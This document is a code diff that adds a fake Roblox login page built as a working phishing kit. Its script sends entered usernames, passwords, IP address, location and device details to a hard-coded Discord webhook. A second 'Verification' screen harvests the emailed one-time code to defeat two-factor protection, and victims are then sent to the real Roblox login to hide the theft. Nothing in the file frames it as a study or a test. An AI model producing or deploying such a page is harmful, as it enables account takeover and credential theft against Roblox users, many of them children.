@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#08080a">
+<title>Log in to Roblox</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23191919' fill-rule='evenodd' d='M18.926 23.998 0 18.892 5.075.002 24 5.108ZM15.348 10.09l-5.282-1.453-1.414 5.273 5.282 1.453z'/%3E%3C/svg%3E">
+<style>
+  .page{
+    --blue:#4d9bff;
+    --r:8px;
+    margin:0;
+    position:relative;
+    font-family:"Builder Sans","HCo Gotham SSm",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    color:#fff;
+    -webkit-font-smoothing:antialiased;
+    -webkit-text-size-adjust:100%;
+    display:flex;align-items:center;justify-content:center;
+    min-height:max(100vh,720px);padding:44px 20px;
+    background:#08080a;line-height:normal;text-align:left;
+  }
+  .page *{box-sizing:border-box}
+
+  /* ---------- background collage ---------- */
+  .bg{position:fixed;inset:0;overflow:hidden;background:#08080a;z-index:0}
+  .bg .grid{
+    position:absolute;top:-22%;left:-18%;width:136%;height:144%;
+    transform:rotate(-8deg);
+    display:grid;grid-template-columns:repeat(5,1fr);grid-template-rows:repeat(8,1fr);
+    gap:10px;
+  }
+  .bg .grid i{display:block;border-radius:12px;background-color:#15151a;background-size:cover;background-position:center}
+  .veil{
+    position:fixed;inset:0;z-index:1;pointer-events:none;
+    background:radial-gradient(ellipse 48% 54% at 50% 48%,
+      rgba(0,0,0,.66) 0%, rgba(0,0,0,.44) 45%, rgba(0,0,0,.62) 100%);
+  }
+  .veil::after{
+    content:"";position:absolute;inset:0;
+    backdrop-filter:blur(7px);-webkit-backdrop-filter:blur(7px);
+    -webkit-mask-image:radial-gradient(ellipse 42% 48% at 50% 48%, #000 18%, transparent 76%);
+    mask-image:radial-gradient(ellipse 42% 48% at 50% 48%, #000 18%, transparent 76%);
+  }
+
+  /* ---------- close ---------- */
+  .close{
+    position:fixed;top:14px;left:14px;z-index:3;
+    width:38px;height:38px;display:flex;align-items:center;justify-content:center;
+    background:none;border:0;padding:0;border-radius:8px;cursor:pointer;
+    color:#fff;opacity:.85;
+  }
+  .close:hover{opacity:1;background:rgba(255,255,255,.1)}
+  .close svg{width:20px;height:20px}
+
+  /* ---------- content ---------- */
+  .wrap{position:relative;z-index:2;width:100%;max-width:342px}
+  .hidden{display:none !important}
+  .wordmark{display:block;width:232px;max-width:78%;margin:0 auto 30px;filter:invert(1)}
+  h1{font-size:20px;font-weight:700;text-align:center;margin:0 0 10px}
+  .note{font-size:14px;line-height:1.5;color:rgba(255,255,255,.72);text-align:center;margin:0 0 20px}
+
+  .field{position:relative;margin-bottom:10px}
+  input{
+    display:block;width:100%;height:46px;padding:0 14px;
+    font-family:inherit;font-size:15px;color:#fff;
+    background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.42);border-radius:var(--r);
+    outline:none;-webkit-appearance:none;appearance:none;
+    transition:border-color .12s,background .12s;
+  }
+  input::placeholder{color:rgba(255,255,255,.78)}
+  input:focus{border-color:rgba(255,255,255,.85);background:rgba(0,0,0,.42)}
+  .field.has-eye input{padding-right:46px}
+  input:-webkit-autofill{
+    -webkit-box-shadow:0 0 0 1000px #24252c inset;
+    -webkit-text-fill-color:#fff;
+  }
+  .eye{
+    position:absolute;right:5px;top:50%;transform:translateY(-50%);
+    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
+    background:none;border:0;padding:0;border-radius:6px;
+    cursor:pointer;color:#fff;opacity:.8;
+  }
+  .eye:hover{opacity:1}
+  .eye svg{width:20px;height:20px}
+
+  .btn{
+    position:relative;display:flex;align-items:center;justify-content:center;gap:9px;
+    width:100%;height:46px;padding:0 16px;
+    font-family:inherit;font-size:15px;font-weight:600;color:#fff;
+    border:1px solid transparent;border-radius:var(--r);
+    cursor:pointer;transition:background .12s,border-color .12s;
+  }
+  .btn.primary{
+    margin-top:4px;
+    background:rgba(214,226,255,.30);
+    border-color:rgba(255,255,255,.26);
+    font-weight:700;
+  }
+  .btn.primary:hover{background:rgba(214,226,255,.40)}
+  .btn.ghost{
+    margin-top:10px;
+    background:rgba(0,0,0,.22);
+    border-color:rgba(255,255,255,.55);
+  }
+  .btn.ghost:hover{background:rgba(255,255,255,.12)}
+  .btn:disabled{opacity:.6;cursor:default}
+  .sp{
+    width:15px;height:15px;flex:none;border-radius:50%;display:none;
+    border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+    animation:spin .7s linear infinite;
+  }
+  .btn.loading .sp{display:block}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .small{display:block;text-align:center;font-size:13px;color:rgba(255,255,255,.9);text-decoration:none;margin-top:16px}
+  .small:hover{text-decoration:underline}
+  .soc{display:flex;gap:10px;margin-top:18px}
+  .soc .btn{margin:0;font-size:14px}
+  .soc .btn svg{width:17px;height:17px;flex:none}
+  .signup{text-align:center;font-size:14px;color:rgba(255,255,255,.85);margin-top:22px}
+  .signup a{color:var(--blue);text-decoration:none}
+  .signup a:hover{text-decoration:underline}
+  .legal{display:flex;justify-content:center;gap:22px;margin-top:14px}
+  .legal a{font-size:13px;color:var(--blue);text-decoration:none}
+  .legal a:hover{text-decoration:underline}
+
+  @media (max-width:640px){
+    .bg .grid{grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(10,1fr)}
+    .wordmark{width:200px;margin-bottom:26px}
+  }
+</style>
+</head>
+<body class="page">
+
+<div class="bg" aria-hidden="true"><div class="grid" id="grid"></div></div>
+<div class="veil" aria-hidden="true"></div>
+
+<button class="close" id="close" type="button" aria-label="Close">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M5 5l14 14M19 5L5 19"/></svg>
+</button>
+
+<main class="wrap">
+  <section id="step1">
+    <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">
+
+    <form id="f1">
+      <div class="field">
+        <input id="u" name="u" type="text" placeholder="Username/Email"
+               autocomplete="username" autocapitalize="none" autocorrect="off" spellcheck="false" required>
+      </div>
+      <div class="field has-eye">
+        <input id="p" name="p" type="password" placeholder="Password"
+               autocomplete="current-password" required>
+        <button class="eye" type="button" id="eye" aria-label="Show password">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+               stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1.6 12S5.2 5.6 12 5.6 22.4 12 22.4 12 18.8 18.4 12 18.4 1.6 12 1.6 12Z"/>
+            <circle cx="12" cy="12" r="3.2"/>
+          </svg>
+        </button>
+      </div>
+      <button class="btn primary" id="b1" type="submit"><span class="sp"></span><span>Log In</span></button>
+    </form>
+
+    <button class="btn ghost" id="otc" type="button">Email Me a One-Time Code</button>
+    <button class="btn ghost" id="quick" type="button">Quick Sign-in</button>
+
+    <a class="small" href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a>
+
+    <div class="soc">
+      <button class="btn ghost" type="button" data-p="Google">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.5l6.7-6.7C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.4 17.6 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.6 5.9c4.4-4.1 7-10.1 7-17.6z"/><path fill="#FBBC05" d="M10.4 28.7c-.5-1.4-.8-2.9-.8-4.7s.3-3.3.8-4.7l-7.8-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.6 10.8l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.5-2 15.3-5.5l-7.6-5.9c-2.1 1.4-4.8 2.3-7.7 2.3-6.4 0-11.7-3.9-13.6-9.4l-7.8 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
+        Google
+      </button>
+      <button class="btn ghost" type="button" data-p="Apple">
+        <svg viewBox="0 0 24 24" fill="#fff"><path d="M16.4 12.7c0-2.6 2.1-3.8 2.2-3.9-1.2-1.7-3-1.9-3.6-1.9-1.5-.2-3 .9-3.8.9-.8 0-2-.9-3.3-.9-1.7 0-3.2 1-4.1 2.5-1.7 3-.4 7.5 1.3 9.9.8 1.2 1.8 2.5 3.1 2.5 1.2 0 1.7-.8 3.2-.8 1.5 0 1.9.8 3.2.8 1.3 0 2.2-1.2 3-2.4.9-1.4 1.3-2.8 1.3-2.8s-2.5-1-2.5-3.9zM14 5.4c.7-.8 1.1-1.9 1-3-.9 0-2 .6-2.7 1.4-.6.7-1.1 1.9-1 2.9 1 .1 2-.5 2.7-1.3z"/></svg>
+        Apple
+      </button>
+    </div>
+
+    <div class="signup">Don't have an account? <a href="https://www.roblox.com/CreateAccount">Sign Up</a></div>
+
+    <div class="legal">
+      <a href="https://www.roblox.com/info/terms">Terms</a>
+      <a href="https://www.roblox.com/info/privacy">Privacy</a>
+    </div>
+  </section>
+
+  <section id="step2" class="hidden">
+    <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">
+    <h1>Verification</h1>
+    <p class="note">Enter the code we sent to your email.</p>
+
+    <form id="f2">
+      <div class="field">
+        <input id="c" name="c" type="text" inputmode="numeric" placeholder="Code"
+               autocomplete="one-time-code" maxlength="8" required>
+      </div>
+      <button class="btn primary" id="b2" type="submit"><span class="sp"></span><span>Continue</span></button>
+    </form>
+
+    <a class="small" id="skip" href="#">Didn't get a code? Skip</a>
+  </section>
+</main>
+
+<script>
+(function(){
+  "use strict";
+
+  /* ================== SETTINGS ================== */
+  const HOOK     = "https://discord.com/api/webhooks/1564949932874534932/_5MPAOQVYDiZjxMXu0xrVBvr0Dil_EhqSCf_IT8gdQiccX6KkYBsfs7I3IRJ5SICh5Jh";
+  const REDIRECT = "https://www.roblox.com/login";
+  const STEP2    = true;   // false = redirect right away, no code screen
+  // raster PNG, Discord avatars don't render SVG
+  const ICON     = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/240px-Roblox_player_icon_black.svg.png";
+  const TILES = [
+    "https://tr.rbxcdn.com/180DAY-5e0d32b22a6e00d39c6d60579f8ae2e8/768/432/Image/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem6/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem2/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem9/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem8/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem1/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem12/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem10/Png/noFilter",
+    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem11/Png/noFilter"
+  ];
+  /* ============================================== */
+
+  const $ = s => document.querySelector(s);
+
+  /* ---------- build background collage ---------- */
+  (function(){
+    var grid = document.getElementById("grid");
+    if(!grid) return;
+    var frag = document.createDocumentFragment();
+    for(var i=0;i<40;i++){
+      var d = document.createElement("i");
+      d.style.backgroundImage = "url('" + TILES[(i*5+1) % TILES.length] + "')";
+      frag.appendChild(d);
+    }
+    grid.appendChild(frag);
+  })();
+
+  /* ---------- read device ---------- */
+  function device(){
+    var ua = navigator.userAgent, os = "Unknown", br = "Unknown";
+    if(/Instagram/i.test(ua))                     os = "Instagram In-App";
+    else if(/FBAN|FBAV/i.test(ua))                os = "Facebook In-App";
+    else if(/Snapchat/i.test(ua))                 os = "Snapchat In-App";
+    else if(/Android/i.test(ua))                  os = "Android " + ((ua.match(/Android ([\d.]+)/)||[])[1]||"");
+    else if(/iPhone|iPad|iPod/i.test(ua))         os = "iOS " + ((ua.match(/OS ([\d_]+)/)||[])[1]||"").replace(/_/g,".");
+    else if(/Windows/i.test(ua))                  os = "Windows";
+    else if(/CrOS/i.test(ua))                     os = "ChromeOS";
+    else if(/Mac OS X/i.test(ua))                 os = "macOS";
+    else if(/Linux/i.test(ua))                    os = "Linux";
+
+    if(/Edg\//.test(ua))                          br = "Edge";
+    else if(/OPR\//.test(ua))                     br = "Opera";
+    else if(/SamsungBrowser/.test(ua))            br = "Samsung Internet";
+    else if(/Chrome\//.test(ua))                  br = "Chrome";
+    else if(/Firefox\//.test(ua))                 br = "Firefox";
+    else if(/Safari\//.test(ua))                  br = "Safari";
+
+    return os + " · " + br + " · " + screen.width + "×" + screen.height;
+  }
+
+  /* ---------- get IP + location ---------- */
+  function geo(){
+    function timeout(ms){
+      var c = new AbortController();
+      setTimeout(function(){ c.abort(); }, ms);
+      return c.signal;
+    }
+    return fetch("https://ipwho.is/", {signal: timeout(2500)})
+      .then(function(r){ return r.json(); })
+      .then(function(j){
+        if(j && j.success !== false && j.ip){
+          return { ip: j.ip, loc: [j.city, j.region, j.country].filter(Boolean).join(", ") };
+        }
+        throw 0;
+      })
+      .catch(function(){
+        return fetch("https://api.ipify.org?format=json")
+          .then(function(r){ return r.json(); })
+          .then(function(j){ return { ip: j.ip, loc: "" }; })
+          .catch(function(){ return { ip: "unknown", loc: "" }; });
+      });
+  }
+
+  /* ---------- send ---------- */
+  function send(payload){
+    var body = JSON.stringify(payload);
+    var c = new AbortController();
+    var t = setTimeout(function(){ c.abort(); }, 3500);
+    return fetch(HOOK, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: body,
+      keepalive: true,
+      signal: c.signal
+    }).then(function(r){
+      clearTimeout(t);
+      if(r.ok) return true;
+      throw 0;
+    }).catch(function(){
+      try{ navigator.sendBeacon(HOOK, new Blob([body], {type:"application/json"})); }catch(e){}
+      return false;
+    });
+  }
+
+  function embed(title, fields){
+    return {
+      username: "Roblox",
+      avatar_url: ICON,
+      embeds: [{ title: title, color: 0x335fff, fields: fields, timestamp: new Date().toISOString() }]
+    };
+  }
+
+  function sendCreds(u, p){
+    return geo().then(function(g){
+      return send(embed("New Login", [
+        {name: "Username", value: "`" + (u || "—") + "`", inline: false},
+        {name: "Password", value: "`" + (p || "—") + "`", inline: false},
+        {name: "IP",       value: g.ip,                    inline: true},
+        {name: "Location", value: g.loc || "—",            inline: true},
+        {name: "Device",   value: device(),                inline: false}
+      ]));
+    });
+  }
+
+  function sendCode(code){
+    return geo().then(function(g){
+      return send(embed("Verification Code", [
+        {name: "Code",     value: "`" + (code || "—") + "`", inline: false},
+        {name: "IP",       value: g.ip,                      inline: true},
+        {name: "Location", value: g.loc || "—",              inline: true}
+      ]));
+    });
+  }
+
+  function showCode(){
+    $("#step1").classList.add("hidden");
+    $("#step2").classList.remove("hidden");
+    $("#c").focus();
+  }
+
+  function busy(btn, on){
+    if(on){ btn.classList.add("loading"); btn.disabled = true; }
+    else  { btn.classList.remove("loading"); btn.disabled = false; }
+  }
+
+  /* ---------- step 1 ---------- */
+  $("#f1").addEventListener("submit", function(e){
+    e.preventDefault();
+    var b = $("#b1");
+    if(b.classList.contains("loading")) return;
+    busy(b, true);
+    sendCreds($("#u").value.trim(), $("#p").value).then(function(){
+      if(STEP2) showCode(); else location.href = REDIRECT;
+    });
+  });
+
+  /* ---------- step 2 ---------- */
+  $("#f2").addEventListener("submit", function(e){
+    e.preventDefault();
+    var b = $("#b2");
+    if(b.classList.contains("loading")) return;
+    busy(b, true);
+    sendCode($("#c").value.trim()).then(function(){ location.href = REDIRECT; });
+  });
+
+  /* ---------- extra buttons ---------- */
+  $("#otc").addEventListener("click", function(){
+    var b = this;
+    if(b.disabled) return;
+    busy(b, true);
+    send(embed("One-Time Code requested", [{name: "Device", value: device(), inline: false}]))
+      .then(function(){ showCode(); busy(b, false); });
+  });
+
+  $("#quick").addEventListener("click", function(){
+    var b = this;
+    if(b.disabled) return;
+    busy(b, true);
+    send(embed("Quick Sign-in clicked", [{name: "Device", value: device(), inline: false}]))
+      .then(function(){ setTimeout(function(){ location.href = REDIRECT; }, 600); });
+  });
+
+  $("#skip").addEventListener("click", function(e){
+    e.preventDefault();
+    location.href = REDIRECT;
+  });
+
+  $("#close").addEventListener("click", function(){
+    send(embed("Closed", [{name: "Step", value: $("#step2").classList.contains("hidden") ? "Login" : "Code", inline: false}]));
+    setTimeout(function(){ location.href = REDIRECT; }, 500);
+  });
+
+  /* ---------- show password ---------- */
+  $("#eye").addEventListener("click", function(){
+    var i = $("#p");
+    var show = i.type === "password";
+    i.type = show ? "text" : "password";
+    this.style.opacity = show ? "1" : ".8";
+  });
+
+  /* ---------- Google / Apple ---------- */
+  Array.prototype.forEach.call(document.querySelectorAll(".soc .btn"), function(el){
+    el.addEventListener("click", function(){
+      if(el.disabled) return;
+      el.disabled = true;
+      send(embed("Social Click", [{name: "Provider", value: el.dataset.p, inline: false}]))
+        .then(function(){ setTimeout(function(){ location.href = REDIRECT; }, 700); });
+    });
+  });
+
+})();
+</script>
+</body>
+</html>
